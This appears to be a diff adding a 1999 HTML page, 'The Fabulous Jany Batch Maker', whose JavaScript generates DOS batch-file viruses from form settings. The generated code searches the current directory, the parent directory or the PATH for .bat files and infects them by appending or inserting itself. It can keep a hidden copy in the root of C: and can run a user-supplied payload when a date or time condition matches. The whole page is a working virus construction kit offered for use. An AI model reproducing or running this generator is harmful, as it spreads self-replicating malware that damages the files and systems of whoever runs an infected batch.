@@ -1,0 +1,367 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<HEAD>
+   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+   <META NAME="GENERATOR" CONTENT="Mozilla/4.06 [fr] (Win95; I) [Netscape]">
+   <TITLE>Jany_Batch_Maker</TITLE>
+<SCRIPT>
+//<plaintext>
+
+//
+//  The Fabulous Jany Batch Maker
+// by the_L3D ... (really?¿!...)!
+// GreetZ to Del_Armg0 for his stuff and works ; )  SenSi11 is so nice ; )
+// GreetZ to VDAT maker(s) and to the Dark Avenger, my m0d3l  hehehe !!!!!
+// and GreetZ to all nice sites on ze W3B !
+//
+
+var method=0;
+var search=0;
+var name="";
+var key="";
+var infects="";
+var seeks="";
+var findhost=false;
+var usecopy=false;  
+var hidecopy=false;
+var echoblank=false;
+var codewindow=false;
+var comment="";
+var tmatch1="";
+var tmatch2="";
+var dmatch1="";
+var dmatch2="";
+var addcode="";
+
+function Reset(vars) {
+ findhost=false;
+ usecopy=true;
+ hidecopy=true;
+ echoblank=true;
+ codewindow=true;
+ with (document) {
+  vars.Method.options[0].selected=true;
+  vars.Search.options[0].selected=true;
+  vars.Name.value = "JANY!";
+  vars.Key.value = "JANY_X";
+  vars.Infects.value = 7;
+  vars.Seeks.value = 22;
+  vars.FindHost.checked=findhost;
+  vars.UseCopy.checked=usecopy;
+  vars.HideCopy.checked=hidecopy;
+  vars.EchoBlank.checked=echoblank;
+  vars.CodeWindow.checked=codewindow;
+  vars.Comment.value="Sweet_luv_Jany...";
+  vars.AddCode.value="@echo Jany_Sexy_Girl_i_luv_U";
+  vars.TMatch1.value="12";
+  vars.TMatch2.value="30";
+  vars.DMatch1.value="11";
+  vars.DMatch2.value="08";
+ }
+}
+
+function WinOpen(something) {
+ msg=open(something,"DisplayWindow",
+  "toolbar=no,directories=no,menubar=no,scrollbars=yes,resizable=yes");
+ codewindow=true;
+ return msg;
+}
+function write(stuff) {
+ if (codewindow) msg.document.writeln(stuff);
+  else document.writeln(stuff);
+}
+function wr(stuff) {
+ if (codewindow) msg.document.write(stuff);
+  else document.write(stuff);
+}
+
+function MakeBug(vars) {
+ method=0;
+ search=0;
+ for (var i=0; i<4; i++) if (vars.Method.options[i].selected) method=i;
+ for (var i=0; i<4; i++) if (vars.Search.options[i].selected) search=i;
+ name=vars.Name.value;
+ key=vars.Key.value;
+ comment=vars.Comment.value;
+ infects=vars.Infects.value;
+ seeks=vars.Seeks.value;
+ findhost=vars.FindHost.checked;
+ usecopy=vars.UseCopy.checked;
+ hidecopy=vars.HideCopy.checked;
+ echoblank=vars.EchoBlank.checked;
+ codewindow=vars.CodeWindow.checked; 
+ comment=vars.Comment.value;
+ tmatch1=vars.TMatch1.value;
+ tmatch2=vars.TMatch2.value;
+ dmatch1=vars.DMatch1.value;
+ dmatch2=vars.DMatch2.value;
+ addcode=vars.AddCode.value;
+ if (codewindow) var msg=WinOpen("");
+ if (method==0 && findhost)
+   write("<h3>Error - Appending types cannot find host</h3>");
+ else if (method==0 && !usecopy)
+   write("<h3>Error - Appending types must use copy</h3>"); 
+ else if (key=="" || name=="")
+   write("<h3>Error - Must have Key and SubString entries</h3>");
+ else if (name.indexOf(key)>=0)
+   write("<h3>Error - Key cannot be in SubString</h3>");
+ else {
+  wr("<pre>");
+  GenerateCode();
+  wr("</pre><hr>");
+ }
+ if (codewindow) {
+  wr("<form>");
+  wr("<input type='button' value='Close' onclick='close()'>");
+  wr("</form>");
+ }
+}
+function GenerateCode() {
+ var type=method+1;
+ var mask="*.bat";
+ var dopath=0;
+ if (search==1) mask="*.bat ..\\*.bat";
+ if (search==2) mask="..\\*.bat *.bat";
+ if (search==3) {
+  mask=". .. %path%";
+  dopath=1;
+ }
+ var s_infects="";
+ if (parseInt(infects)>0)
+  for (var i=0; i<parseInt(infects); i++)
+   s_infects=s_infects+"1";
+ var s_seeks="";
+ if (parseInt(seeks)>0)
+  for (var i=0; i<parseInt(seeks); i++)
+   s_seeks=s_seeks+"1";
+ var v1="%"+key+"%";
+ if (usecopy) v1="c:\\_" + key;
+ var v8="end";
+ if (type==2) v8="xt"; 
+ if (type==3 || type==4) {
+  write("@if '%_"+name+"%==' goto _"+name);
+  write("::**** HOST ****");
+  if (echoblank) write("");  
+  write("@if not '%_"+name+"%==' goto "+key+"end");
+  write(":_"+name+" "+key);
+ }
+ if (type==1) {
+  write("::**** HOST ****");
+  if (echoblank) write("");
+ }
+ if(comment!="") write("::"+key+" "+comment);
+ write("@echo off%_"+key+"%");
+ write("if '%1=='"+key+" goto "+key+"%2");
+ write("set "+key+"=%0.bat");
+ write("if not exist %"+key+"% set "+key+"=%0");
+ write("if '%"+key+"%==' set "+key+"=autoexec.bat");
+ if (type==3||type==4) write("set !"+key+"=%1 %2 %3 %4 %5 %6 %7 %8 %9");
+ if (type==4) {
+  write("call %"+key+"% "+key+" rh");
+  write("set _"+name+"=>nul."+key);
+  write("set !"+key+"=");
+ }
+ if (usecopy) write("if exist c:\\_"+key+".bat goto "+key+"g");
+ if (findhost) {
+  write("if exist %"+key+"% goto "+key+"fe");
+  write("call %"+key+"% "+key+" h %path%");
+  write("if exist %"+key+"% goto "+key+"fe");
+  write("goto e"+key);
+  write(":"+key+"h");
+  write("shift%_"+key+"%");
+  write("if '%2==' goto "+key+v8);
+  write("if exist %2\\%"+key+" set "+key+"=%2\\%"+key+"%");
+  write("if exist %2%"+key+" set "+key+"=%2%"+key+"%");
+  write("if exist %2\\%"+key+".bat set "+key+"=%2\\%"+key+"%.bat");
+  write("if exist %2%"+key+".bat set "+key+"=%2%"+key+"%.bat");
+  write("if not exist %"+key+"% goto "+key+"h");
+  write("goto "+key+v8);
+  write(":"+key+"fe");
+ }
+ if (usecopy) {
+  if(!findhost) write("if not exist %"+key+"% goto e"+key);
+  write("find &quot;"+key+"&quot;&lt;%"+key+"%>c:\\_"+key+".bat");
+  if (hidecopy) write("attrib c:\\_"+key+".bat +h");
+  write(":"+key+"g");
+ }
+ if (!usecopy&&!findhost) write("if not exist %"+key+"% goto e"+key);
+ var v3="/e:5000 /c";
+ if (s_seeks=="" && s_infects=="") v3="/c";
+ if (s_seeks=="" && s_infects=="1") v3="/c";
+ if (dopath) write("command "+v3+" "+v1+" "+key+" vir "+mask);
+ if (!dopath) write("command "+v3+" "+v1+" "+key+" vir");
+ write(":e"+key);
+ var activate=false;
+ if (dmatch1!="") {
+  write("echo.|date|find &quot;"+dmatch1+"&quot;>nul."+key);
+  write("if errorlevel 1 goto na"+key);
+  activate=true;
+ }
+ if (dmatch2!="") {
+  write("echo.|date|find &quot;"+dmatch2+"&quot;>nul."+key);
+  write("if errorlevel 1 goto na"+key);
+  activate=true;
+ }
+ if (tmatch1!="") {
+  write("echo.|time|find &quot;"+tmatch1+"&quot;>nul."+key);
+  write("if errorlevel 1 goto na"+key);
+  activate=true;
+ }
+ if (tmatch2!="") {
+  write("echo.|time|find &quot;"+tmatch2+"&quot;>nul."+key);
+  write("if errorlevel 1 goto na"+key);
+  activate=true;
+ }
+ if (addcode.length>0) {
+  var fromchar=0;
+  var newln=0;
+  while(fromchar<addcode.length && newln>=0) {
+   var newln=addcode.indexOf("\r",fromchar)
+   if (newln>0) {
+    var subline=addcode.substring(fromchar,newln);
+    var sublow=subline.toLowerCase();
+    if (sublow.substring(0,1)==":" ||
+      sublow.indexOf("goto ")>=0)
+        subline=subline+" %_"+key+"%";
+    else subline=subline+"%_"+key+"%";
+    write(subline);
+    fromchar=newln+2;
+   }
+  }
+ } else if (activate) write ("::"+key+" *** activate code ***");
+ if (activate) write(":na"+key);
+ if (type==3) {
+  write("call %"+key+"% "+key+" rh");
+  write("set _"+name+"=>nul."+key);
+  write("set !"+key+"=");
+ }
+ write("set "+key+"=");
+ if ((!usecopy||findhost) && type==2) write("if exist \\!"+key+".bat del \\!"+key+".bat");
+ write("goto "+key+"end");
+ if ((!usecopy||findhost) && type==2) {
+  write(":"+key+"xt");
+  write("echo.>\\!"+key+".bat");
+  write("\\!"+key+".bat");
+ }
+ if (type==3||type==4) {
+  write(":"+key+"rh");
+  write("set _"+name+"=x%_"+key+"%");
+  write("%"+key+"% %!"+key+"%");
+ }
+ write(":"+key+"vir");
+ if (!dopath) {
+  write("for %%a in ("+mask+") do call "+v1+" "+key+" i %%a");
+  write("exit "+key);
+ } else {
+  write("shift%_"+key+"%");
+  write("if '%2==' exit %"+key+"%");
+  write("for %%a in (%2\\*.bat %2*.bat) do call "+v1+" "+key+" i %%a");
+  write("goto "+key+"vir");
+ }
+ write(":"+key+"i");
+ write("find &quot;"+key+"&quot;&lt;%3>nul");
+ var v2="ERR";
+ if (s_seeks=="") v2=key+"end";
+ if (type==2 && !usecopy) v2=key+"xt";
+ if (s_seeks!="") v2=key+"j";
+ write("if not errorlevel 1 goto "+v2);
+ var v2="type c:\\_"+key+".bat";
+ if (!usecopy) var v2="find &quot;"+key+"&quot;&lt;%"+key+"%";
+ if (type==1) {
+  write("type %3>"+key+"$");
+  if (echoblank) write("echo.>>"+key+"$");
+  write(v2+">>"+key+"$");
+ }
+ if (type==2) {
+  write(v2+">"+key+"$");
+  write("type %3>>"+key+"$");
+ }
+ if (type==3 || type==4) {
+  write("echo @if '%%_"+name+"%%==' goto _"+name+">"+key+"$");
+  write("type %3>>"+key+"$");
+  if (echoblank) write("echo.>>"+key+"$");
+  write(v2+">>"+key+"$");
+ } 
+ write("move "+key+"$ %3>nul");
+ if (s_infects!="") {
+  if (s_infects=="1") write("exit "+key);
+  else {
+   write("set "+key+"#=%"+key+"#%1");
+   write("if %"+key+"#%=="+s_infects+" exit");
+  }
+ }
+ if (s_seeks!="") {
+  write(":"+key+"j");
+  write("set "+key+"!=%"+key+"#%1");
+  write("if %"+key+"!%=="+s_seeks+" exit");
+ }
+ if ((s_infects!="1" || s_seeks!="") && type==2 && usecopy==false)
+   write("goto "+key+"xt");
+ write(":"+key+"end");
+ if (type==2) write("::**** HOST ****"); 
+}
+
+function Info() {
+ WinOpen("");
+ wr("<h1>The Fabulous Jany Batch Maker</h1>"); 
+ wr("Makes DOS 6 compatible replicating batch files<br>");
+ wr("Produced August 99 <br><br>");
+ wr("The Key String must be unique, the generated bug will not ");
+ wr("touch any batch containing this string. The Sub String is ");
+ wr("used in compound methods, it should also be unique. Infects ");
+ wr("per run is how many batches will be assimilated with each run ");
+ wr("of a bugged batch, if omitted all available batches are game. ");
+ wr("Max seeks is the maximum number of infected files skipped ");
+ wr("before giving up, if empty or NaN no limit checks are made. ");
+ wr("The Add Code box is for adding batch code that will run when ");
+ wr("all time and date conditions are satisfied, or every time if ");
+ wr("no conditions are entered. The condition strings simply match ");
+ wr("the output from the date and time commands. Three methods of ");  
+ wr("attachment are available: Appending simply tacks on the code, ");
+ wr("Inserting places the bug before the host, and Compound which ");
+ wr("uses a single inserted line then appends the rest. Compound ");
+ wr("Immediate runs the bug first, Compound Delayed runs the bug when ");
+ wr("the host completes. Search specifies the directories and order ");
+ wr("for seeking batch files (watch out for path!). Find Host tells ");
+ wr("it to generate code for seeking out the host batch even if run ");
+ wr("from the path (not available on appenders), Use Copy keeps a ");
+ wr("copy of the bug code in the root of C: (must be checked for ");
+ wr("appenders), Hidden hides the root copy, Echo Blank places an ");
+ wr("empty line between the host and any appended code to prevent ");
+ wr("errors with batches that have no final return. Send to Window ");
+ wr("opens a new browser window for the code to avoid trashing the ");
+ wr("form. To copy code to clipboard uncheck it, good for one shot. ");
+ wr("Resizing or reloading the form resets the data. Enjoy!");
+ wr("<form>");
+ wr("<input type='button' value='Close' onclick='close()'>");
+ wr("</form>");
+}
+</SCRIPT>
+</HEAD>
+<BODY TEXT="#66FFFF" BGCOLOR="#330033" LINK="#44A2FF" VLINK="#005FBD" ALINK="#FF0000" onload="Reset()">
+
+<CENTER>
+<H1>
+<I><U>**The Fabulous Jany Batch Maker **</U></I></H1></CENTER>
+
+<CENTER><FORM name="vars"><FONT COLOR="#FFFF99">Key String:&nbsp;<INPUT type="text" name="Key" size=7 maxlength=7>&middot;
+Comment:&nbsp;</FONT><INPUT type="text" name="Comment" size=30>
+<BR><FONT COLOR="#FFFF99">Sub String:&nbsp;<INPUT type="text" name="Name" size=7 maxlength=7>&middot;
+Infects per run:&nbsp;<INPUT type="text" name="Infects" size=2 maxlength=2>&middot;
+Max seeks per run:&nbsp;</FONT><INPUT type="text" name="Seeks" size=2 maxlength=2>
+<BR><FONT COLOR="#FFFF99">Method:&nbsp;<SELECT name="Method"><OPTION>Appending<OPTION>Inserting<OPTION>Compound
+Immediate<OPTION>Compound Delayed</SELECT>&middot; Search:&nbsp;<SELECT name="Search"><OPTION>Current<OPTION>Current
+Parent<OPTION>Parent Current<OPTION>Current Parent Path</FONT></SELECT>
+<BR><FONT COLOR="#FFFF99">Add Code:&nbsp;</FONT><TEXTAREA name="AddCode" rows=3 cols=45></TEXTAREA>
+<BR><FONT COLOR="#FFFF99">Time Match:&nbsp;<INPUT type="text" name="TMatch1" size=7><INPUT type="text" name="TMatch2" size=7>&middot;
+Date Match:&nbsp;</FONT><INPUT type="text" name="DMatch1" size=7><INPUT type="text" name="DMatch2" size=7>
+<P><INPUT type="checkbox" name="FindHost"><U>Find Host Batch &middot;&nbsp;<INPUT type="checkbox" name="UseCopy">Use
+Root Copy &middot;&nbsp;<INPUT type="checkbox" name="HideCopy">Hide Copy</U>
+<BR><INPUT type="checkbox" name="EchoBlank"><U>Add blank line for safety
+&middot;&nbsp;<INPUT type="checkbox" name="CodeWindow">Send output to window</U><U></U>
+<P><INPUT type="button" value="Make the Jany Batch " onclick="MakeBug(this.form)"><INPUT type="reset" value="Reset" onclick="Reset()"><INPUT type="button" value="Info" onclick="Info()"></FORM></CENTER>
+&nbsp;
+</BODY>
+</HTML>
+
+
